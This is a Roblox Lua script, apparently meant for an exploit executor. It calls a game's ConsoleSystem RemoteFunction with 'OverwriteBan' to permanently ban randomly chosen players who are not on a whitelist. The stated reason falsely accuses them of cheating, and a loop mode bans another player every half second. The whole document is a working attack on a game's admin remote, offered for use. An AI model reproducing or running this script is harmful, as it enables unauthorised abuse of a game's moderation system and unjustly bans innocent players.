-- Whitelist of player IDs
local whitelist = {
    45553395,
    104336994,
    4738107242,
    104336994
}

-- Rest of the script...
local LocalPlayer = game.Players.LocalPlayer

-- Add the local player's ID to the whitelist
table.insert(whitelist, LocalPlayer.UserId)

-- Function to generate a random player ID (excluding IDs in the whitelist)
function getRandomPlayerID()
    local players = game.Players:GetPlayers()
    local playerCount = #players
    
    if playerCount > 0 then
        local randomIndex = math.random(1, playerCount)
        local randomPlayer = players[randomIndex]
        
        -- Check if the randomly selected player is not in the whitelist
        if not table.find(whitelist, randomPlayer.UserId) then
            return randomPlayer.UserId
        end
    end
    return nil
end

-- Function to print the random player ID
function BanRandomPlayer(a, b, c)
    local randomPlayerID = getRandomPlayerID()
    
    if randomPlayerID then
        local UserID = randomPlayerID
        local Reason = a
        local Type = b -- perm or temp
        local Time = c
        
        if Type == "temp" then
            game:GetService("ReplicatedStorage").ConsoleSystem.RemoteFunction:InvokeServer("OverwriteBan",{baninfo = {tonumber(UserID), LocalPlayer.UserId, "temp", Time, Reason}, userid = tonumber(UserID)},"DataStore")
        else
            game:GetService("ReplicatedStorage").ConsoleSystem.RemoteFunction:InvokeServer("OverwriteBan",{baninfo = {tonumber(UserID), LocalPlayer.UserId, Type, Reason}, userid = tonumber(UserID)},"DataStore")
        end
    else
        print("Failed to obtain a random player ID.") -- Replace with an appropriate error message
    end
end

local function loopban()
    while true do
        BanRandomPlayer("Cheats - Contact HyperSpeed#7040 if you feel like this ban was unfair.", "perm", "9999999999 minutes")
        wait(0.5)
    end
end

local function randomban()
    BanRandomPlayer("Cheats - Contact HyperSpeed#7040 if you feel like this ban was unfair.", "perm", "9999999999 minutes")
end

if mode == "loop" then
    loopban()
elseif mode == "random" then
    randomban()
end
